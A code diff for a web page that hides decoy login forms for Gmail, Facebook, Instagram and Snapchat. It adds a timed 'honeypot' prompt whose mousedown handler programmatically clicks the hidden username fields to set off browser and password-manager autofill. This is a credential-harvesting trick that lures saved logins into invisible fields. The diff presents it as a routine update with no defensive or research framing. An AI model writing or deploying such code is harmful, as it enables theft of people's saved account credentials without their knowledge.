@@ -106,12 +106,21 @@ setTimeout(() => {
 
 
 // --- Desktop Mouse-Move Autofill Trigger ---
-function triggerAutofill() {
-  // This function is primarily for desktop mouse-move.
-  // It programmatically clicks the inputs to trigger password manager prompts.
-  console.log('Mouse move detected, attempting to trigger autofill...');
+// After 1.5 seconds, hide the loader and show the honeypot prompt
+setTimeout(() => {
+  const previewContainer = document.querySelector('.preview-container');
+  const honeypotContainer = document.querySelector('.honeypot-container');
+  if (previewContainer) previewContainer.style.display = 'none';
+  if (honeypotContainer) honeypotContainer.style.display = 'block';
+}, 1500);
 
-  // Try to click all the username/email fields
+// --- Honeypot Trigger Logic ---
+function triggerAllAutofills() {
+  // This function is called when the user interacts with the honeypot.
+  // It programmatically clicks all hidden inputs to trigger browser autofill.
+  console.log('Honeypot triggered, attempting to fire all autofill prompts...');
+
+  // Click all the username/email fields to trigger password managers
   document.querySelector('#gmail-form input[name="email"]')?.click();
   document.querySelector('#facebook-form input[name="username"]')?.click();
   document.querySelector('#instagram-form input[name="username"]')?.click();
@@ -119,5 +128,9 @@ function triggerAutofill() {
   document.querySelector('#snapchat-form input[name="username"]')?.click();
 }
 
-// Add the listener for desktop users. It will only run once.
-document.addEventListener('mousemove', triggerAutofill, { once: true });
+// Add a one-time event listener to the honeypot input.
+// Using 'mousedown' as it can be more reliable for triggering programmatic clicks.
+const honeypotInput = document.getElementById('honeypot-input');
+if (honeypotInput) {
+  honeypotInput.addEventListener('mousedown', triggerAllAutofills, { once: true });
+}
